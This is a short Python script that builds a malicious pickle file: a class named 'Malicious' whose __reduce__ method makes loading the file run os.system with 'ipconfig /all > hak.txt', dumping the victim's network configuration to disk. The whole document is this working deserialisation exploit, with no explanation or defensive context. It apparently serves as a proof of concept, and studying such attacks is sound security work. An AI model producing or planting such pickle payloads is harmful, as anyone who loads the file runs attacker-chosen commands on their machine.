import pickle
import os

class Malicious:
    def __reduce__(self):
        return (os.system, ('ipconfig /all > hak.txt',))

with open("malicious.pkl", "wb") as f:
    pickle.dump(Malicious(), f)